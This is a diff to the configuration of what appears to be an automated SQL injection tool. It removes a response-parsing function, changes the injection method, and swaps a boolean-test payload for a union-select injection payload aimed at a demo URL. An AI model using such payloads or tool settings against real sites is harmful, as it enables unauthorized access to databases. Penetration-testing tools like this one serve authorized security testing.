@@ -9,33 +9,8 @@ import logging
 __author__ = "LoRexxar"
 
 
-"""
-若注入方式为normal，你需要自定义解包函数, 提供两种方式，一种为find, 一种为bs4
-需要注意的是，这里输入为r.text.encode('utf-8'), return必须为查询返回值，不能带标签符号等
-def UnpackFunction(self, r):
-    index = r.find('<td>')
-    index2 = r[index + 4:].find('</td>')
-    return r[index + 4:][:index2]
-
-bs4
-def UnpackFunction(r):
-    soup = BeautifulSoup(r, "lxml")
-    r = soup.find_all("td")[1].string
-    return r
-"""
-
-
-def UnpackFunction(r):
-    # index = r.find('<td>')
-    # index2 = r[index + 4:].find('</td>')
-    soup = BeautifulSoup(r, "lxml")
-    r = soup.prettify()
-    try:
-        r = soup.find_all("td")[1].string
-    except IndexError:
-        logger.error("UnpackFunction error...")
-        exit(0)
-    return r
+def UnpackFunction():
+    pass
 
 
 class BaseConfig:
@@ -43,7 +18,7 @@ class BaseConfig:
         """
         基类初始化，整个注入工具的核心配置
         """
-        self.version = "V1.0.1"
+        self.version = "V1.1.0"
 
         # 目标url
         self.url = 'http://demo.lorexxar.pw/post.php'
@@ -75,7 +50,7 @@ class BaseConfig:
             "build",
             "time"
         )
-        self.sqlimethod = SqliMethod[2]
+        self.sqlimethod = SqliMethod[0]
 
         # 若注入方式为normal，你需要自定义解包函数, 提供两种方式，一种为find, 一种为bs4,解包函数在上面
 
@@ -106,7 +81,7 @@ class BaseConfig:
         eg: self.payload = "padding' && 2333 #"
 
         """
-        self.payload = "padding' && 2333 #"
+        self.payload = "padding' union all select 1,'Feigong' #"
 
         """
         配置请求,把请求中payload的位置设置为Feigong（如果拼错了就会全部无效...）
@@ -183,7 +158,7 @@ class BaseConfig:
 
         self.filter = {
             # padding 为填充字段，build与注入要求padding必须为真值
-            'padding': 'user1',
+            'padding': 'user',
             # 符号替换（url encode是get默认自带的，不需要修改）
             '\'': '\'',
             '\"': '\"',
